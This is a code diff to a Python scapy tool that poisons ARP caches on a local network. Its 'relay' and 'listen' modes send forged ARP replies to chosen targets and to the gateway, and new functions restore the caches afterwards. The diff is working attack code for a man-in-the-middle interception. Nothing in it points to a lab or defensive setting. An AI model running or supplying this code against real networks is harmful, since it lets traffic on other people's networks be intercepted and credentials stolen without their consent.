@@ -67,18 +67,25 @@ def get_mac_addresses(ip_list):
     return(mac_addresses)
 
 def relaymode_arp_spoof(spoofed_ip):
+    # mac_addresses = update_uphosts()
+    mac_addresses = mac_addresses = get_mac_addresses(TargetsList)
     timer = 0
     while not stop_arp_spoofing_flag.is_set() :
-        if Targets != set() : send(ARP(op = 2, pdst = list(Targets), psrc = spoofed_ip), verbose = False)
+        if Targets != set() :
+            packets_list = []
+            for target in mac_addresses :
+                packets_list.append(Ether(dst=mac_addresses[target]) / ARP(op = 2, psrc = spoofed_ip))
+            sendp(packets_list, verbose=False)
         time.sleep(1)
         timer += 1
         if timer == 3 :
-            update_uphosts()
+            mac_addresses = update_uphosts()
             timer = 0
 
 def listenmode_arp_spoof():
+    gateway_mac = getmacbyip(gw)
     while not stop_arp_spoofing_flag.is_set() :
-        if Targets != set() : send(ARP(op = 2, pdst = gw, psrc = list(Targets)), verbose = False)
+        if Targets != set() : sendp(Ether(dst=gateway_mac) / (ARP(op = 2, psrc = list(Targets))), verbose=False)
         time.sleep(1)
 
 def valid_ip(address):
@@ -452,9 +459,18 @@ def restore(poisoned_device, spoofed_ip):
     send(packet, verbose = False, count=1)
 
 def restore_listenmode(dic_mac_addresses):
+    packets_list = []
+    gateway_mac = getmacbyip(gw)
     for ip_address in dic_mac_addresses :
-        packet = ARP(op = 2, pdst = gw, psrc = ip_address, hwsrc = dic_mac_addresses[ip_address]) 
-        send(packet, verbose = False, count=1)
+        packets_list.append(Ether(dst=gateway_mac) / ARP(op = 2, psrc = ip_address, hwsrc = dic_mac_addresses[ip_address]))
+    sendp(packets_list, verbose = False)
+
+def restore_relaymode(dic_mac_addresses):
+    packets_list = []
+    gateway_mac = getmacbyip(gw)
+    for target in dic_mac_addresses :
+        packets_list.append(Ether(dst=dic_mac_addresses[target]) / ARP(op = 2, psrc = gw, hwsrc = gateway_mac))
+    sendp(packets_list, verbose = False)
 
 
 def update_uphosts():
@@ -470,7 +486,7 @@ def update_uphosts():
     if len(new_hosts) > 0 or len(old_hosts) > 0 :
         logging.debug(f'[*] Net probe check, updated targets list : {list(Targets)}')
         if Targets == set() : logging.warning(f'[!] No more target is up. Continuing probing targets...')
-
+    return mac_addresses
 
 
 
@@ -479,8 +495,7 @@ def update_uphosts():
 
 def restore_all_targets():
     if mode == 'relay':
-        for target in Targets :
-            restore(target,gw)
+        restore_relaymode(get_mac_addresses(list(Targets)))
     elif mode == 'listen':
         restore_listenmode(get_mac_addresses(list(Targets)))
 
